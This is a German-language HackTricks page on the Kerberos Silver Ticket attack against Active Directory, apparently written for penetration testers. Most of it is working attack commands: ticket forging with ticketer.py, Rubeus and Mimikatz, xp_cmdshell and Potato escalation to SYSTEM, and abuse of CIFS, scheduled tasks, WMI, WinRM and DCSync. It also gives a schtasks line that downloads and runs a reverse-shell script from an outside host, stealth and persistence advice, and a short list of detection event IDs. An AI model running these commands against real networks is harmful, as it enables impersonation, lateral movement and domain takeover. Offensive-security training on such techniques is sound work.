# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Beim **Silver Ticket**-Angriff werden Service-Tickets in Active-Directory-(AD-)Umgebungen ausgenutzt. Diese Methode beruht darauf, den **NTLM-Hash eines Dienstkontos** wie eines Computerkontos zu erlangen, um ein Ticket Granting Service (TGS)-Ticket zu fälschen. Mit diesem gefälschten Ticket kann ein Angreifer auf bestimmte Dienste im Netzwerk zugreifen und sich als **beliebiger Benutzer ausgeben**, wobei typischerweise administrative Berechtigungen angestrebt werden. Es wird betont, dass die Verwendung von AES-Schlüsseln zum Fälschen von Tickets sicherer und schwerer zu erkennen ist.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets sind schwerer zu erkennen als Golden Tickets, da sie nur den **Hash des Dienstkontos** und nicht das krbtgt-Konto erfordern. Sie sind jedoch auf den jeweiligen Zieldienst beschränkt. Außerdem reicht es, das Passwort eines Benutzers zu stehlen.
Außerdem kannst du, wenn du das Passwort eines **Kontos mit einem SPN** kompromittierst, dieses Passwort verwenden, um ein Silver Ticket zu erstellen und dich bei diesem Dienst als beliebiger Benutzer auszugeben.

### Moderne Kerberos-Änderungen (nur AES in der Domäne)

- Windows-Updates ab **8. Nov. 2022 (KB5021131)** verwenden standardmäßig **AES-Sitzungsschlüssel** für Service-Tickets, sofern möglich, und schaffen RC4 schrittweise ab. Es wird erwartet, dass RC4 auf DCs bis Mitte 2026 standardmäßig **deaktiviert** ist. Daher scheitert die Verwendung von NTLM-/RC4-Hashes für Silver Tickets zunehmend mit `KRB_AP_ERR_MODIFIED`. Extrahiere immer **AES-Schlüssel** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) für das Zieldienstkonto.<sup>[[5]](#references)</sup>
- Wenn `msDS-SupportedEncryptionTypes` des Dienstkontos auf AES beschränkt ist, musst du das Ticket mit `/aes256` oder `-aesKey` fälschen; RC4 (`/rc4` oder `-nthash`) funktioniert nicht, selbst wenn du den NTLM-Hash hast.<sup>[[6]](#references)</sup>
- gMSA-/Computerkonten werden alle 30 Tage geändert. Extrahiere den **aktuellen AES-Schlüssel** aus LSASS, Secretsdump/NTDS oder per DCsync, bevor du das Ticket fälschst.
- OPSEC: Die standardmäßige Ticket-Laufzeit beträgt in Tools oft **10 Jahre**. Lege realistische Laufzeiten fest (z. B. `-duration 600` Minuten), um durch ungewöhnliche Laufzeiten nicht entdeckt zu werden.<sup>[[6]](#references)</sup>

Zum Erstellen von Tickets kommen je nach Betriebssystem unterschiedliche Tools zum Einsatz:

### Unter Linux

```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### Unter Windows

```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
  /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
  /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

Der CIFS-Dienst wird als häufiges Ziel für den Zugriff auf das Dateisystem des Opfers hervorgehoben, aber auch andere Dienste wie HOST und RPCSS können für Tasks und WMI-Abfragen ausgenutzt werden.

### Beispiel: MSSQL-Dienst (MSSQLSvc) + Potato zu SYSTEM

Wenn du den NTLM-Hash (oder den AES-Schlüssel) des Kontos besitzt, dem ein **registrierter, exakt übereinstimmender SQL-Dienst-SPN** gehört, akzeptiert dieser Dienst möglicherweise ein gefälschtes Service-Ticket. Die Dienstklasse und der Hostname im Ticket müssen dem tatsächlichen SPN entsprechen. Gehe nicht davon aus, dass jede Installation `MSSQLSvc/` verwendet. Die angegebene Identität muss außerdem einem SQL-Login mit den erforderlichen Berechtigungen zugeordnet sein, um `xp_cmdshell` zu aktivieren und auszuführen. Erfolgreiche `xp_cmdshell`-Befehle werden unter der Prozessidentität des SQL-Dienstes ausgeführt (oder, bei Aufrufern ohne sysadmin-Rechte, unter einem konfigurierten Proxy). Prüfe dieses **Prozess-Token** auf aktiviertes `SeImpersonatePrivilege`, bevor du einen separaten Potato-Angriff in Betracht ziehst. Eine Dienstkonfiguration oder ein SPN allein ist kein ausreichender Nachweis dafür.<sup>[[4]](#references)</sup>

```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
  -spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
  -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```

- Wenn der resultierende Sicherheitskontext über SeImpersonatePrivilege verfügt (bei Dienstkonten oft der Fall), verwende eine Potato-Variante, um SYSTEM zu erhalten:

```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```

Weitere Details zum Missbrauch von MSSQL und zum Aktivieren von xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Übersicht über Potato-Techniken:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Verfügbare Dienste

| Diensttyp                                 | Silver Tickets für Dienste                                                 |
| ----------------------------------------- | -------------------------------------------------------------------------- |
| WMI                                       | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                       | <p>HOST</p><p>HTTP</p><p>Je nach Betriebssystem auch:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                     | <p>HOST</p><p>HTTP</p><p>Manchmal reicht es, Folgendes anzufordern: WINRM</p> |
| Geplante Tasks                            | HOST                                                                       |
| Windows-Dateifreigabe, auch psexec        | CIFS                                                                       |
| LDAP-Operationen, einschließlich DCSync   | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                            | krbtgt                                                                     |

Mit **Rubeus** können Sie mithilfe des Parameters **alle** diese Tickets anfordern:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver-Ticket-Ereignis-IDs

- 4624: Kontoanmeldung
- 4634: Kontoabmeldung
- 4672: Administratoranmeldung
- **Wenn auf dem DC für denselben Client/Dienst kein vorhergehendes 4768/4769 vorliegt**, ist das ein häufiges Anzeichen dafür, dass ein gefälschtes TGS direkt dem Dienst vorgelegt wurde.
- Eine ungewöhnlich lange Ticketlaufzeit oder ein unerwarteter Verschlüsselungstyp (RC4, wenn die Domäne AES erzwingt) fallen ebenfalls in den Daten von 4769/4624 auf.

## Persistenz

Damit Computer ihr Passwort nicht alle 30 Tage ändern, setzen Sie `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1`. Alternativ können Sie `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` auf einen Wert über 30 Tage setzen, um den Zeitraum festzulegen, nach dem das Computerpasswort geändert werden soll.<sup>[[3]](#references)</sup>

## Missbrauch von Service Tickets

Nehmen wir in den folgenden Beispielen an, dass das Ticket durch die Identitätsübernahme des Administratorkontos abgerufen wurde.

### CIFS

Mit diesem Ticket können Sie über **SMB** auf die Ordner `C$` und `ADMIN$` zugreifen (sofern sie freigegeben sind) und Dateien an einen beliebigen Ort im Remote-Dateisystem kopieren, indem Sie etwa Folgendes ausführen:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

Du kannst außerdem mithilfe von **psexec** eine Shell auf dem Host erhalten oder beliebige Befehle ausführen:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Mit dieser Berechtigung kannst du geplante Tasks auf Remotecomputern erstellen und beliebige Befehle ausführen:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

Mit diesen Tickets kannst du **WMI auf dem Opfersystem ausführen**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Finde **weitere Informationen zu wmiexec** auf der folgenden Seite:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Mit WinRM-Zugriff auf einen Computer kannst du **darauf zugreifen** und sogar eine PowerShell erhalten:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Sieh dir die folgende Seite an, um **weitere Möglichkeiten kennenzulernen, mit winrm eine Verbindung zu einem Remote-Host herzustellen**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Beachte, dass **winrm auf dem Remote-Computer aktiv sein und auf Verbindungen warten muss**, damit du darauf zugreifen kannst.

### LDAP

Mit diesem Privileg kannst du die DC-Datenbank mit **DCSync** auslesen:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Erfahre mehr über DCSync** auf der folgenden Seite:


{{#ref}}
dcsync.md
{{#endref}}


## References

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Wie greift man Kerberos an? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Maschinenkontokennwortprozess - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato-Pfad](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos-Hardening und RC4-Abkündigung](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Aktuelle Optionen von Impacket ticketer.py (AES/Keytab/Dauer)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)
{{#include ../../banners/hacktricks-training.md}}
